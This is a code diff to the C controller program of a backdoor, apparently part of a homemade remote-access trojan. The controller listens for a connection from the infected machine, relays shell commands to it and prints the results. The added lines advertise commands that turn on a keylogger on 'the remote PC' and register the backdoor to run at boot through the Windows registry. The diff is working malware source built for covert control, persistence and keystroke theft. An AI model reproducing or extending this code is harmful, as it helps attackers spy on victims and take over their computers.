@@ -35,7 +35,6 @@ int main(){
     // Buffers for handling commands
     char buffer[1024];
     char response[18834];
-
     #ifdef _WIN32
     WSADATA wsaData;
 
@@ -45,7 +44,6 @@ int main(){
     } 
     #endif
 
-    int optionValue = 1;
 	socklen_t client_length;
 
     struct sockaddr_in ServerAddress, ClientAddress;
@@ -53,18 +51,14 @@ int main(){
 
     sock = socket(AF_INET, SOCK_STREAM, 0);
 
-    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optionValue, sizeof(optionValue)) != 0){
-        printf("Error setting options for TCP. Aborting....");
-        exit(1);
-    }
-
     ServerAddress.sin_family = AF_INET;
     ServerAddress.sin_addr.s_addr = INADDR_ANY;
 
     // Defining specific port for listening to
     ServerAddress.sin_port = htons(port);
 
-    
+    printf("Waiting for connection to establish....\n");
+
     bind(sock, (struct sockaddr *) &ServerAddress, sizeof(ServerAddress));
     listen(sock, 5);
 
@@ -72,8 +66,14 @@ int main(){
 
     client_socket = accept(sock, (struct sockaddr *) &ClientAddress, &client_length);
 
+    printf("Connection established correctly!\n");
+    printf("There are some particular commands that wont be executed on the remote PC these are the followings:\n");
+    printf("\"quit\" - This command will let you quit the program without causing bugs on remote PC.\n");
+    printf("\"keylogger\" - This command will be used to activate the keylogger on the remote PC.\n");
+    printf("\"setbootrun\" - This command will set the backdoor as an auto run program in the registry in the remote PC.\n");
+    printf("Make sure to type them correctly without capital letters to execute these commands!\n\n");
+
     while(1){
-        label:
 
         bzero(&buffer, sizeof(buffer));
         bzero(&response, sizeof(response));
@@ -89,11 +89,11 @@ int main(){
         write(client_socket, buffer, sizeof(buffer));
         #endif
 
-        if(strncmp("q", buffer, 1) == 0){
+        if(strcmp("quit", buffer) == 0){
             break;
         }
         // You can add some exceptions here for the buffer input
-        else{
+        else if(strcmp("keylogger", buffer) != 0 && strcmp("setbootrun", buffer) != 0 && strncmp("cd ", buffer, 3) != 0){
             recv(client_socket, response, sizeof(response), 0);
             printf("%s", response);
         }   
